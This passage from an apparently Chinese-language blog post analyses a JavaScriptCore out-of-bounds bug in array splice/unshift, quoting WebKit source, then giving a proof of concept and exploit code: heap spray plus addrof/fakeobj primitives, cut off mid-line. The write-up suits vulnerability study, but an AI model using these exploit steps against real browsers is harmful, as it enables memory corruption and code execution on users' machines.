numElementsAfterShiftRegion);<br>        &#125;<br>        <span class="hljs-comment">// Clear the slots of the elements we just moved.</span><br>        <span class="hljs-type">unsigned</span> startOfEmptyVectorTail = usedVectorLength - count;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = startOfEmptyVectorTail; i &lt; usedVectorLength; ++i)<br>            storage-&gt;m_vector[i].<span class="hljs-built_in">clear</span>();<br>        <span class="hljs-comment">// We don&#x27;t modify the index bias or the Butterfly pointer in this case because we&#x27;re not changing </span><br>        <span class="hljs-comment">// the start of the Butterfly, which needs to point at the first indexed property in the used </span><br>        <span class="hljs-comment">// portion of the vector. We also don&#x27;t modify the vector length because we&#x27;re not actually changing</span><br>        <span class="hljs-comment">// its length; we&#x27;re just using less of it.</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="unshift"><a href="#unshift" class="headerlink" title="unshift"></a>unshift</h3><p>下面第22行调用了<code>unshiftCount</code>，同上面流程一样，下面就省略中间的路径，直接看<code>unshiftCountWithArrayStorage</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;JSArray::ShiftCountMode shiftCountMode&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unshift</span><span class="hljs-params">(ExecState* exec, JSObject* thisObj, <span class="hljs-type">unsigned</span> header, <span class="hljs-type">unsigned</span> currentCount, <span class="hljs-type">unsigned</span> resultCount, <span class="hljs-type">unsigned</span> length)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = exec-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(resultCount &gt; currentCount);<br>    <span class="hljs-type">unsigned</span> count = resultCount - currentCount;<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(header &lt;= length);<br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(currentCount &lt;= (length - header));<br><br>    <span class="hljs-comment">// Guard against overflow.</span><br>    <span class="hljs-keyword">if</span> (count &gt; UINT_MAX - length) &#123;<br>        <span class="hljs-built_in">throwOutOfMemoryError</span>(exec, scope);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isJSArray</span>(thisObj)) &#123;<br>        JSArray* array = <span class="hljs-built_in">asArray</span>(thisObj);<br>        <span class="hljs-keyword">if</span> (array-&gt;<span class="hljs-built_in">length</span>() == length) &#123;<br>            <span class="hljs-type">bool</span> handled = array-&gt;<span class="hljs-built_in">unshiftCount</span>&lt;shiftCountMode&gt;(exec, header, count);<br>            <span class="hljs-built_in">EXCEPTION_ASSERT</span>(!scope.<span class="hljs-built_in">exception</span>() || handled);<br>            <span class="hljs-keyword">if</span> (handled)<br>                <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> k = length - currentCount; k &gt; header; --k) &#123;<br>        <span class="hljs-type">unsigned</span> from = k + currentCount - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">unsigned</span> to = k + resultCount - <span class="hljs-number">1</span>;<br>        JSValue value = <span class="hljs-built_in">getProperty</span>(exec, thisObj, from);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        <span class="hljs-keyword">if</span> (value) &#123;<br>            thisObj-&gt;<span class="hljs-built_in">putByIndexInline</span>(exec, to, value, <span class="hljs-literal">true</span>);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">bool</span> success = thisObj-&gt;<span class="hljs-built_in">methodTable</span>(vm)-&gt;<span class="hljs-built_in">deletePropertyByIndex</span>(thisObj, exec, to);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(!success)) &#123;<br>                <span class="hljs-built_in">throwTypeError</span>(exec, scope, UnableToDeletePropertyError);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="unshiftCountWithArrayStorage"><a href="#unshiftCountWithArrayStorage" class="headerlink" title="unshiftCountWithArrayStorage"></a>unshiftCountWithArrayStorage</h4><p>上面经过<code>shift</code>函数设定数组的元素数量，下面的<code>hasHoles()</code>函数可以返回<code>fasle</code>，最后到达第40行</p><p>其中vector是<code>storage-&gt;m_vector</code>指向元素的位置，整体上将元素向前移动一个元素结果覆盖了<code>length</code>字段就能导致越界访问</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">JSArray::unshiftCountWithArrayStorage</span><span class="hljs-params">(ExecState* exec, <span class="hljs-type">unsigned</span> startIndex, <span class="hljs-type">unsigned</span> count, ArrayStorage* storage)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = exec-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    <span class="hljs-type">unsigned</span> length = storage-&gt;<span class="hljs-built_in">length</span>();<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(startIndex &lt;= length);<br><br>    <span class="hljs-comment">// If the array contains holes or is otherwise in an abnormal state,</span><br>    <span class="hljs-comment">// use the generic algorithm in ArrayPrototype.</span><br>    <span class="hljs-keyword">if</span> (storage-&gt;<span class="hljs-built_in">hasHoles</span>() || storage-&gt;<span class="hljs-built_in">inSparseMode</span>() || <span class="hljs-built_in">shouldUseSlowPut</span>(<span class="hljs-built_in">indexingType</span>()))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-type">bool</span> moveFront = !startIndex || startIndex &lt; length / <span class="hljs-number">2</span>;<br><br>    <span class="hljs-type">unsigned</span> vectorLength = storage-&gt;<span class="hljs-built_in">vectorLength</span>();<br><br>    <span class="hljs-comment">// Need to have GC deferred around the unshiftCountSlowCase(), since that leaves the butterfly in</span><br>    <span class="hljs-comment">// a weird state: some parts of it will be left uninitialized, which we will fill in here.</span><br>    <span class="hljs-function">DeferGC <span class="hljs-title">deferGC</span><span class="hljs-params">(vm.heap)</span></span>;<br>    <span class="hljs-keyword">auto</span> locker = <span class="hljs-built_in">holdLock</span>(<span class="hljs-built_in">cellLock</span>());<br>    <br>    <span class="hljs-keyword">if</span> (moveFront &amp;&amp; storage-&gt;m_indexBias &gt;= count) &#123;<br>        Butterfly* newButterfly = storage-&gt;<span class="hljs-built_in">butterfly</span>()-&gt;<span class="hljs-built_in">unshift</span>(<span class="hljs-built_in">structure</span>(vm), count);<br>        storage = newButterfly-&gt;<span class="hljs-built_in">arrayStorage</span>();<br>        storage-&gt;m_indexBias -= count;<br>        storage-&gt;<span class="hljs-built_in">setVectorLength</span>(vectorLength + count);<br>        <span class="hljs-built_in">setButterfly</span>(vm, newButterfly);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!moveFront &amp;&amp; vectorLength - length &gt;= count)<br>        storage = storage-&gt;<span class="hljs-built_in">butterfly</span>()-&gt;<span class="hljs-built_in">arrayStorage</span>();<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">unshiftCountSlowCase</span>(locker, vm, deferGC, moveFront, count))<br>        storage = <span class="hljs-built_in">arrayStorage</span>();<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">throwOutOfMemoryError</span>(exec, scope);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    WriteBarrier&lt;Unknown&gt;* vector = storage-&gt;m_vector;<br>    <span class="hljs-comment">//下面第一个memmove可以将内存整体向前移动一个单位，PoC中增了1个元素</span><br>    <span class="hljs-keyword">if</span> (startIndex) &#123;<br>        <span class="hljs-keyword">if</span> (moveFront)<br>            <span class="hljs-built_in">memmove</span>(vector, vector + count, startIndex * <span class="hljs-built_in">sizeof</span>(JSValue));<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (length - startIndex)<br>            <span class="hljs-built_in">memmove</span>(vector + startIndex + count, vector + startIndex, (length - startIndex) * <span class="hljs-built_in">sizeof</span>(JSValue));<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; count; i++)<br>        vector[i + startIndex].<span class="hljs-built_in">clear</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="setLength"><a href="#setLength" class="headerlink" title="setLength"></a>setLength</h2><p>可以看到第34行当新长度满足<code>newLength &gt; MAX_STORAGE_VECTOR_LENGTH</code>时，数组就变为<code>ArrayStorage</code>类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">JSArray::setLength</span><span class="hljs-params">(JSGlobalObject* globalObject, <span class="hljs-type">unsigned</span> newLength, <span class="hljs-type">bool</span> throwException)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = globalObject-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    Butterfly* butterfly = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">butterfly</span>();<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-built_in">indexingMode</span>()) &#123;<br>    <span class="hljs-keyword">case</span> ArrayClass:<br>        <span class="hljs-keyword">if</span> (!newLength)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (newLength &gt;= MIN_SPARSE_ARRAY_INDEX) &#123;<br>            <span class="hljs-built_in">RELEASE_AND_RETURN</span>(scope, <span class="hljs-built_in">setLengthWithArrayStorage</span>(<br>                globalObject, newLength, throwException,<br>                <span class="hljs-built_in">ensureArrayStorage</span>(vm)));<br>        &#125;<br>        <span class="hljs-built_in">createInitialUndecided</span>(vm, newLength);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">case</span> CopyOnWriteArrayWithInt32:<br>    <span class="hljs-keyword">case</span> CopyOnWriteArrayWithDouble:<br>    <span class="hljs-keyword">case</span> CopyOnWriteArrayWithContiguous:<br>        <span class="hljs-keyword">if</span> (newLength == butterfly-&gt;<span class="hljs-built_in">publicLength</span>())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-built_in">convertFromCopyOnWrite</span>(vm);<br>        butterfly = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">butterfly</span>();<br>        FALLTHROUGH;<br><br>    <span class="hljs-keyword">case</span> ArrayWithUndecided:<br>    <span class="hljs-keyword">case</span> ArrayWithInt32:<br>    <span class="hljs-keyword">case</span> ArrayWithDouble:<br>    <span class="hljs-keyword">case</span> ArrayWithContiguous: &#123;<br>        <span class="hljs-keyword">if</span> (newLength == butterfly-&gt;<span class="hljs-built_in">publicLength</span>())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (newLength &gt; MAX_STORAGE_VECTOR_LENGTH <span class="hljs-comment">// This check ensures that we can do fast push.</span><br>            || (newLength &gt;= MIN_SPARSE_ARRAY_INDEX<br>                &amp;&amp; !<span class="hljs-built_in">isDenseEnoughForVector</span>(newLength, <span class="hljs-built_in">countElements</span>()))) &#123;<br>            <span class="hljs-built_in">RELEASE_AND_RETURN</span>(scope, <span class="hljs-built_in">setLengthWithArrayStorage</span>(<br>                globalObject, newLength, throwException,<br>                <span class="hljs-built_in">ensureArrayStorage</span>(vm)));<br>        &#125;<br>        <span class="hljs-keyword">if</span> (newLength &gt; butterfly-&gt;<span class="hljs-built_in">publicLength</span>()) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">ensureLength</span>(vm, newLength)) &#123;<br>                <span class="hljs-built_in">throwOutOfMemoryError</span>(globalObject, scope);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-type">unsigned</span> lengthToClear = butterfly-&gt;<span class="hljs-built_in">publicLength</span>() - newLength;<br>        <span class="hljs-type">unsigned</span> costToAllocateNewButterfly = <span class="hljs-number">64</span>; <span class="hljs-comment">// a heuristic.</span><br>        <span class="hljs-keyword">if</span> (lengthToClear &gt; newLength &amp;&amp; lengthToClear &gt; costToAllocateNewButterfly) &#123;<br>            <span class="hljs-built_in">reallocateAndShrinkButterfly</span>(vm, newLength);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">indexingType</span>() == ArrayWithDouble) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = butterfly-&gt;<span class="hljs-built_in">publicLength</span>(); i-- &gt; newLength;)<br>                butterfly-&gt;<span class="hljs-built_in">contiguousDouble</span>().<span class="hljs-built_in">at</span>(<span class="hljs-keyword">this</span>, i) = PNaN;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = butterfly-&gt;<span class="hljs-built_in">publicLength</span>(); i-- &gt; newLength;)<br>                butterfly-&gt;<span class="hljs-built_in">contiguous</span>().<span class="hljs-built_in">at</span>(<span class="hljs-keyword">this</span>, i).<span class="hljs-built_in">clear</span>();<br>        &#125;<br>        butterfly-&gt;<span class="hljs-built_in">setPublicLength</span>(newLength);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>        <br>    <span class="hljs-keyword">case</span> ArrayWithArrayStorage:<br>    <span class="hljs-keyword">case</span> ArrayWithSlowPutArrayStorage:<br>        <span class="hljs-built_in">RELEASE_AND_RETURN</span>(scope, <span class="hljs-built_in">setLengthWithArrayStorage</span>(globalObject, newLength, throwException, <span class="hljs-built_in">arrayStorage</span>()));<br>        <br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">CRASH</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PoC分析"><a href="#PoC分析" class="headerlink" title="PoC分析"></a>PoC分析</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1</span>]<br><span class="hljs-comment">// 创建一个数组，类型为ArrayWithInt32</span><br><br>arr.<span class="hljs-property">length</span> = <span class="hljs-number">0x100000</span><br><span class="hljs-comment">// 将arr的长度设为0x100000，由于数组最初仅有1个数组，这样会产生很多空洞hole，并且数组类型也更改为ArrayWithArrayStorage</span><br><br><br>arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x11</span>)<br><span class="hljs-comment">// 表示从index=0开始删除0x11个元素，对应的位置上会变成undefined</span><br><span class="hljs-comment">// 最终会调用到shiftCountWithArrayStorage，使得后续hasHoles()返回false</span><br><span class="hljs-comment">// m_numValuesInVector = 1 - 0x11 = 0xfffffff0</span><br><br>arr.<span class="hljs-property">length</span> = <span class="hljs-number">0xfffffff0</span><br><span class="hljs-comment">// 长度设置为0xfffffff0, 使得hasHoles()返回为false</span><br><br>arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0xfffffff0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br><span class="hljs-comment">// 这条语句相当于添加一个元素，这里会调用unshift，最终会调用到unshiftCountWithArrayStorage</span><br></code></pre></td></tr></table></figure><h2 id="Exp分析"><a href="#Exp分析" class="headerlink" title="Exp分析"></a>Exp分析</h2><h3 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> conversion_buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>)<br><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(conversion_buffer)<br><span class="hljs-keyword">var</span> i32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(conversion_buffer)<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">BASE32</span> = <span class="hljs-number">0x100000000</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f2i</span>(<span class="hljs-params">f</span>) &#123;<br>    f64[<span class="hljs-number">0</span>] = f<br>    <span class="hljs-keyword">return</span> i32[<span class="hljs-number">0</span>] + <span class="hljs-title class_">BASE32</span> * i32[<span class="hljs-number">1</span>]<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">i2f</span>(<span class="hljs-params">i</span>) &#123;<br>    i32[<span class="hljs-number">0</span>] = i % <span class="hljs-title class_">BASE32</span><br>    i32[<span class="hljs-number">1</span>] = i / <span class="hljs-title class_">BASE32</span><br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>]<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="HeapSpray"><a href="#HeapSpray" class="headerlink" title="HeapSpray"></a>HeapSpray</h3><p>整体内存走向是低到高；首先将内存分成块的形式（比如下面两个中等箭头对应的块），然后再将每个块进行内部划分比如叫节，然后在一个块中由高地址的节到低地址的节的顺序进行分配，在每个节中内存是按照由低到高的形式进行分配（比如下面小箭头对应的）</p><p><img src="/2023/04/06/JSC--OOB/image-20240911204744829.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1</span>];<br>arr.<span class="hljs-property">length</span> = <span class="hljs-number">0x100000</span>;<br>arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x11</span>);<br>arr.<span class="hljs-property">length</span> = <span class="hljs-number">0xfffffff0</span>;<br><br><span class="hljs-keyword">let</span> spray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x3000</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x3000</span>; i += <span class="hljs-number">2</span>) &#123;<br>    spray[i]   = [<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>+i];<br>    spray[i+<span class="hljs-number">1</span>] = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x3000</span>; i += <span class="hljs-number">2</span>)<br>    spray[i][<span class="hljs-number">0</span>] = <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x1337</span>)<br><br><br>arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br><br>fake_index=-<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x3000</span>;i+=<span class="hljs-number">2</span>)&#123;<br>    <span class="hljs-keyword">if</span>(spray[i].<span class="hljs-property">length</span>!=<span class="hljs-number">10</span>)&#123;<br>        <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;hit: &quot;</span>+i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>        fake_index=i;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Primitive"><a href="#Primitive" class="headerlink" title="Primitive"></a>Primitive</h3><p>浮点数组称之为unboxed，对象数组称之为boxed</p><p><strong>addrof：</strong> 先将对象写进boxed数组中，然后通过unboxed来越界读取成浮点数，最终返回将浮点数转成整数的结果</p><p><strong>fakeobj：</strong>先将地址转为浮点数，然后通过unboxed将地址写进boxed数组中，最后通过boxed数组读取对应地址的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">unboxed = spray[fake_index];<br>boxed = spray[fake_index+<span class="hljs-number">1</span>];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>)&#123;<br>    boxed[<span class="hljs-number">0</span>] = obj;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">f2i</span>(unboxed[<span class="hljs-number">14</span>]);<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeobj</span>(<span class="hljs-params">addr</span>)&#123;<br>    unboxed[<span class="hljs-number">14</span>] = <span class="hljs-title function_">i2f</span>(addr);<br>    <span class="hljs-keyword">return</span> boxed[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Rest"><a href="#Rest" class="headerlink" title="Rest"></a>Rest</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs js">victim = [<span class="hljs-number">1.1</span>];<br>victim[<span class="hljs-number">0</span>] =<span class="hljs-number">3.3</span>;<br>victim[<span class="hljs-string">&#x27;prop&#x27;</span>] = <span class="hljs-number">13.37</span>;<br>victim[<span class="hljs-string">&#x27;prop&#x27;</span>+<span class="hljs-number">1</span>] = <span class="hljs-number">13.37</span>;<br><span class="hljs-title function_">print</span>(<span class="hljs-title function_">describe</span>(victim))<br><span class="hljs-title function_">print</span>(<span class="hljs-title function_">addrof</span>(victim).<span class="hljs-title 